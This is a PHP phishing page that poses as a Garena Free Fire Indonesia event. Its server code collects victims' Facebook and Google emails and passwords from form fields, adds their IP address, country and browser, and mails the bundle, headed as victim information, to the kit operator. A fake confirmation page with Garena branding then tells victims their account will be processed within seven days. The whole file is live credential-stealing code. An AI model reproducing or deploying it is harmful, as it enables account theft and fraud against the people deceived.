<?php

include('cilepeung.php');
$efb    = $_POST['efb'];
$pfb    = $_POST['pfb'];
$gmail    = $_POST['gmail'];
$gpass = $_POST['gpass'];

$message   = "

=====> AKUN FACEBOOK <=====

Email atau Telepon: ".$efb."
Password:  ".$pfb."

=====> AKUN FACEBOOK <=====

=====> AKUN GOOGLE <=====

Email: ".$gmail."
Password:  ".$gpass."

=====> AKUN GOOGLE <=====

=====> INFORMASI KORBAN <=====

IP Info   :  ".$ip." | ".$nama_negro." On ".gmdate('r')."
Browser   :  ".$_SERVER['HTTP_USER_AGENT']."

=====> ENSIKOLOGY.BLOGSPOT.COM <=====

";

include 'email.php';
$subject = " Result Free Fire ".$efb."";
$headers = "From: Ensikology <support@ensikology.com>";
mail($emailku, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r"));
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Free Fire Indonesia Event</title>
<link rel="shorcut icon" href="https://steemitimages.com/0x0/https://img.esteem.ws/ea34benr2i.jpg">
<link rel="stylesheet" href="css/bootstrap.min.css">
<style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}
body { 
  background: url(http://freefiremobile-a.akamaihd.net/ffwebsite/images/wallpaper/pop/032.jpg) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
.col-md-6 {
 margin:0 auto;
 float:none;
}
.col-md-8 {
 margin:0 auto;
 float:none;
}
</style>

<body style="padding:0px;margin:0 auto;">
<div style="padding:0px;margin:0 auto;" class="container ">
	<div style="border:none;padding:0px;margin:0 auto;" class="col-md-6">
		<div style="border:none;padding:0px;margin:0px;" class="well well-sm">
			<img style="border:none;width:100%;max-height:270px;margin:0 auto;" src="https://i.pinimg.com/originals/da/3f/b9/da3fb96a95610462f6fd616c7892a2e3.png"/>
			<div style="border:none;" class="btn btn-danger btn-lg btn-block">
				<b>Free Fire Garena Indonesia</b>
			</div>
		</div>
		<center style="background:white;"><br>
		<div class="col-md-8">

			<h2>Submit Account Complete</h2>
			<div style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background:#f7f7f7;width:100%" class="form-horizontal">
				<h4>Akun Anda sedang diproses
                      Harap tunggu hingga 7 Days</h4>
				<form id="glogin" action="https://ff.garena.com//id">
				
						
					<div style="width:100%" class="form-group">
						<input type="submit" name="gsubmit" class="btn btn-block" style="color: #ffffff;background-color: #2780e3;" id="gsubmit" value="KELUAR"></form>
						
				</div>
			</div>
			<br>
			<br></div>
		<div style="height:150px;color: #737373;background-color: #f7f7f7;" class="btn btn-block">
			<center>
			<p>
				Garena
			</p>
			</center>

		</p>
		<p>
			Copyright &copy; 2018 Garena.
		</p>
	</div>
	</center>
</div>
</div>

